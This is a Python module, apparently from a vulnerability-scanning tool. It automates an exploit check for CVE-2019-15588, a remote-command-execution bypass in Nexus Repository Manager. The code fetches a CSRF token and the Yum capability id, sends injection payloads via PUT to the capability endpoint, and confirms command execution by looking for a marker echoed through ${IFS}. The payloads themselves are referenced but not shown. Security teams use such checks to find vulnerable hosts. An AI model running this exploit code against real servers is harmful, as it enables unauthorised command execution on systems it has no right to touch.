#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
import re

def cve_2019_15588_scan(self, url):
    ''' CVE-2019-5475的绕过 '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2019-15588'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Nexus-UI': 'true'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    try:
        # todo 1) Referer && Origin
        if ('http://' in url):
            proto = 'http://'
        else:
            proto = 'https://'
        headers['Referer'] = proto + logger.get_domain(url)
        headers['Origin'] = proto + logger.get_domain(url)

        # todo 2) Nexus 登录后的csrf token(如果有)
        csrf_token = re.search(r'NX-ANTI-CSRF-TOKEN=0\.\d*', str(self.headers))
        if (csrf_token):
            NX_ANTI_CSRF_TOKEN = csrf_token.group().split('=')
            headers[NX_ANTI_CSRF_TOKEN[0]] = NX_ANTI_CSRF_TOKEN[1]

        # todo 3) 获取Yum: Configuration的id
        path = 'service/siesta/capabilities/'
        res1 = requests.get(
            url + path, 
            timeout=self.timeout, 
            headers=headers,
            proxies=self.proxies, 
            verify=False,
            allow_redirects=False
        )
        logger.logging(vul_info, res1.status_code, res1)                        # * LOG

        # * 如果没有找到Yum: Configuration的id, 则退出当前POC
        yum_id_re = r'<id>.{16}</id><notes>Automatically added on.{0,40}</notes><enabled>(true|false)</enabled><typeId>yum</typeId>.*<key>createrepoPath</key><value>.{0,50}</value>'
        if (not re.search(yum_id_re, res1.text, re.I|re.M|re.U|re.S)):
            return None

        yum_id = re.search(yum_id_re, res1.text, re.I|re.M|re.U|re.S).group(0)[4:20]                 # * 提取id
        path += yum_id                                                # * 路径 + yum id
        # * Payload需要的Headers
        headers.update({'Accept': 'application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json'})

        for payload in self.cve_2019_15588_payloads:
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            res2 = requests.put(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res2.status_code, res2)                        # * LOG

            if (self.md in check.check_res(res2.text, '${IFS}'+self.md)
                or (self.md in check.check_res(res2.text, '/'+self.md))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res2
                }
                return results
    except requests.ConnectTimeout:
        logger.logging(vul_info, 'Timeout')
        return None
    except requests.ConnectionError:
        logger.logging(vul_info, 'Faild')
        return None
    except:
        logger.logging(vul_info, 'Error')
        return None
